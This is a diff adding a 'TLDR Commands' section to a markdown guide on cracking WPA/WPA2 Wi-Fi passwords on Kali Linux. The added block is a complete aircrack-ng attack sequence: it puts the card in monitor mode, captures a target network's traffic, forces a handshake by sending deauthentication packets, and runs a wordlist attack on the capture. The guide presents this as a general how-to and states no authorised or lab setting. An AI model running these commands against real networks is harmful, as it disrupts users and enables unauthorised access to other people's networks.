@@ -1,5 +1,19 @@
 # Password Cracking
 
+## TLDR Commands
+
+```bash
+sudo apt-get install aircrack-ng #installs the aircrack suite
+sudo airmon-ng start wlan0 #assuming wlan0 is the wlan of the wireless card
+sudo airodump-ng wlan0mon #see local BSSIDs/ESSIDs
+#run following on one terminal
+sudo airodump-ng -c <channel_number_of_network> --bssid <BSSID of network> -w <output location of captured files> wlan0mon
+#run following on another terminal and wait for handshake capture
+sudo aireplay --deauth <count of deauthentication packets> -a <BSSID of network> wlan0mon
+#after capture
+sudo aircrack-ng <location of .cap file> -w <dictionary or wordlist>
+```
+
 ## Setup
 
 When it comes to password cracking, there are two main components that can potentially prevent you from cracking the password. This is not being able to capture the 4-way handshake, as well as not having the actual password in your wordlist. This guide will walk you though how to crack WPA/WPA2 passwords, as long as you have the two aforementioned items. I will be doing these cracks using the Kali Linux VMware OS. In order to intercept packets and crack passwords, we will need a network adapter. I have bought [this one](https://www.amazon.com/Panda-300Mbps-Wireless-USB-Adapter/dp/B00EQT0YK2/) from Amazon:
